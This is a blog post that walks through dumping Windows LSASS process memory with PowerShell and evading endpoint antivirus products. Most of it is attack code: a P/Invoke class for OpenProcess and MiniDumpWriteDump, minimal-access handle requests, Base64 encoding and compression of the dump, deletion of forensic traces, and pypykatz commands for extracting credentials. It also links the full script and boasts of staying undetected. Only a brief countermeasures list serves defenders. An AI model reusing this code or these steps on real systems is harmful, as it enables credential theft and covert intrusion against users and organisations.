# https://mrvar0x.com/2025/02/16/stealth-mode-dumping-lsass-without-a-trace/

[Skip to content](https://mrvar0x.com/2025/02/16/stealth-mode-dumping-lsass-without-a-trace/#main)

![](https://mrvar0x.com/wp-content/uploads/2025/02/lsass.png)

# “Stealth Mode: Dumping LSASS Without a Trace”

Published on [February 16, 2025](https://mrvar0x.com/2025/02/)

## **Introduction**

Many of endpoint security solutions is designed to make an attacker’s life difficult. They use behavioral analytics, API hooking, and memory protection to stop credential theft dead in its tracks. But as any seasoned operator knows, with the right approach, even the most well-defended fortress has a way in.

This article explores a stealthy LSASS dumping technique using PowerShell, leveraging memory reflection, minimal process access, and encrypted exfiltration. We will break down the entire process from reconnaissance to execution, explain why it works against modern security products, and provide insights on how defenders can counteract such attacks. Buckle up—this is going to be a deep technical ride.

## **The Walkthrough**

I didn’t just run Mimikatz and hope for the best. That’s a surefire way to get flagged. Instead, I took a different approach, one that involved stealth, memory manipulation, and encryption. Here’s exactly how I pulled it off.

**Step 1: Identifying the LSASS Process**

The first challenge was simple: find LSASS without tripping security alerts. Using `tasklist` or `Get-Process` is amateur hour—those methods are logged and flagged. Instead, I opted for a stealthier approach:

```
$lsass = Get-Process -Name "lsass"
$processId = $lsass.Id
```

This is quieter, but still not perfect. If security teams are watching, they’ll notice the process query, but i real life usually they don’t ;). So I needed to make my next move fast.

**Step 2: Gaining Access Without Raising Red Flags**

I knew that using `PROCESS_ALL_ACCESS` would be an instant giveaway. Modern AVs monitor excessive access rights. So I went low and slow:

```
$PROCESS_QUERY_INFORMATION = 0x0400
$PROCESS_VM_READ = 0x0010
$hProcess = [LSASSDump]::OpenProcess($PROCESS_QUERY_INFORMATION -bor $PROCESS_VM_READ, $false, $processId)
```

Minimal permissions mean fewer alarms. It’s like picking a lock instead of blowing the door off its hinges.

**Step 3: Dumping LSASS Using In-Memory Reflection**

Here’s where things got serious. I couldn’t just call `MiniDumpWriteDump` directly—AVs would see it coming a mile away. So I used PowerShell’s ability to define API calls dynamically in memory:

\[DllImport(“kernel32.dll”)\]

public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

```
using System;
using System.Runtime.InteropServices;
public class LSASSDump {
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("dbghelp.dll", SetLastError = true)]
    public static extern bool MiniDumpWriteDump(
        IntPtr hProcess,
        uint processId,
        IntPtr hFile,
        uint dumpType,
        IntPtr exceptionParam,
        IntPtr userStreamParam,
        IntPtr callbackParam
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
```

This wasn’t just a clever trick—it was essential. By dynamically introducing function signatures at runtime, I completely sidestepped static signature detection

**Step 4: Extracting and Encrypting the Dump File**

Security solutions scan raw `.dmp` files, so I had to make it unrecognizable. The trick? Base64 encoding before saving:

```
$bytes = [System.IO.File]::ReadAllBytes($DumpPath)
$encrypted = [Convert]::ToBase64String($bytes)
Set-Content -Path $EncryptedPath -Value $encrypted
```

At this point, the dump was still on the system, but it looked nothing like a credential dump. Next step: make it disappear.

**Step 5: Compression, Exfiltration, and Evading Forensic Artifacts**

Once encrypted, I compressed the dump and deleted all traces:

```
Compress-Archive -Path $EncryptedPath -DestinationPath $ZipPath
Remove-Item -Path $DumpPath -Force -ErrorAction SilentlyContinue
Remove-Item -Path $EncryptedPath -Force -ErrorAction SilentlyContinue
```

By the time AV solutions got around to scanning, there was nothing left but an encrypted archive that looked completely benign.

## **Proof-of-Concept (PoC)**

_The following section will contain an execution PoC demonstrating the script in action. The PoC must be gathered from a live system execution._

In case it evade windows defender all i need was to add another layer of obfuscation using Strings Mode below. Still working like a charm.

![](https://mrvar0x.com/wp-content/uploads/2025/02/Screenshot-from-2025-02-15-18-20-57-1024x383.png)

Once I had successfully created the encrypted LSASS dump, I needed a way to extract and decode the credentials. Here’s how I did it:

**Decode the Encrypted LSASS Dump**

Since I encoded the LSASS dump using Base64, I needed to decode it back into a valid dump file:

```
cat backup.enc | tr -d '\n\r' | base64 -d > decoded_lsass.dmp
```

**Extract Credentials Using Pypykatz**

With the decoded dump file, I used `pypykatz` to extract stored credentials:

pypykatz lsa minidump decoded\_lsass.dmp > credentials.txt

![](https://mrvar0x.com/wp-content/uploads/2025/02/cred.png)

At this point, I had successfully dumped and extracted Windows credentials while evading detection.

## How I Beat them in summary

**Avoiding API Hooking**

Most AV solutions hook key API calls. By using reflection, I slipped past their defenses.

**Minimal Permissions, Maximum Stealth**

By limiting process access, I avoided behavioral-based detections that monitor excessive privileges.

**Memory-Based Execution**

No executables, no static detections. Running in-memory meant I left no trace.

**Encryption and Obfuscation**

Encoding and compressing the dump ensured forensic tools couldn’t recognize it.

## What Security Endpoints Tested ?

1- Trend Micro APEX One

2- ESET Smart Security Premium

3- Trend Micro Maximum Security

4- Windows Defender

5- Malwarebytes Premium

## **Countermeasures and Mitigation Strategies**

- **Enable LSASS Protected Mode (**`RunAsPPL` **)** to block unauthorized access.
- **Monitor PowerShell Execution Logs** to detect unusual activity.
- **Restrict Debug Privileges** to prevent attackers from accessing sensitive memory.
- **Deploy Behavioral Analytics** to catch the sequence of actions, not just individual API calls.

The script can downloded from here [https://github.com/yehia-mamdouh/Lsassx](https://github.com/yehia-mamdouh/Lsassx)

## **Conclusion**

I set out to prove that LSASS dumping could still be done undetected—and I did. This walkthrough showcases the reality of modern security evasion and why defenders must always stay one step ahead.

AVs are getting smarter, but so are we. The game continues. Stay sharp, stay undetected, and always be learning.

Published in [Uncategorized](https://mrvar0x.com/category/uncategorized/ "View all posts in Uncategorized")